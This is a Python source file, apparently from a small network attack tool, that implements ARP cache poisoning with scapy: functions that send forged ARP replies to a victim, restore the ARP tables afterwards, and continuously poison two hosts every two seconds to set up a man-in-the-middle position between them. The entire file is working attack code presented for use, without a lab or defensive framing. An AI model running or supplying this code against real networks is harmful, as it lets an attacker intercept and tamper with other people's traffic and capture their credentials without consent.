'''This package contains everything related to ARP poisoning'''

from time import sleep
import click
from scapy.all import ARP, send, conf
from .general import get_target_mac

def poison(victim_ip, spoof_ip, victim_mac='', interface=''):
    '''
    Change mac address in arp table of victim
    '''

    try:
        # Only get target mac if victim mac is not specified
        if victim_mac == '':
            # Get victim host ip address using previously created function
            victim_mac = get_target_mac(victim_ip, interface)

        # Set interface to the default if not specified
        if interface == '':
            interface = conf.iface

        # Create the ARP packet, scapy will add your MAC address for hwsrc
        # op=2 means that ARP is going to send answer
        packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)

        # Send the ARP packet without output
        send(packet, verbose=False)
    except:
        click.echo('Victim not found')


def restore_arp(victim_ip, spoof_ip, interface=''):
    '''
    Restore mac address in arp table
    '''

    # Set interface to the default if not specified
    if interface == '':
        interface = conf.iface
    try:
        # Find the MAC adresses of the victim and the IP you spoofed
        victim_mac = get_target_mac(victim_ip, interface)
        spoof_real_mac = get_target_mac(spoof_ip, interface)
   
        # Create the ARP packet, Now we want to add the actual MAC of the spoofed IP
        packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                        psrc=spoof_ip, hwsrc=spoof_real_mac)
   
        # Send the ARP packet without output
        send(packet, count=4, verbose=False, iface=interface)
    except:
        click.echo('Victim not found')


def mitm_arp(victim_1_ip, victim_2_ip, interface):
    '''
    Sets up a man in the middle attack between the two provided victim IPs
    '''

    try:
        # Do not ask for MAC address continuously, but only every 2 seconds
        while True:
            # Get MAC addresses of victims
            victim_1_mac = get_target_mac(victim_1_ip, interface)
            victim_2_mac = get_target_mac(victim_2_ip, interface)

            # Poison victims
            poison(victim_1_ip, victim_2_ip, victim_1_mac, interface)
            poison(victim_2_ip, victim_1_ip, victim_2_mac, interface)

            sleep(2)
    except KeyboardInterrupt:
        click.echo('\nInterupted, Reseting ARP tables. Please wait')

        # Restore poisoning
        restore_arp(victim_1_ip, victim_2_ip, interface)
        restore_arp(victim_2_ip, victim_1_ip, interface)
        
        click.echo('\nARP table restored.')
    except:
        click.echo('Victim not found')
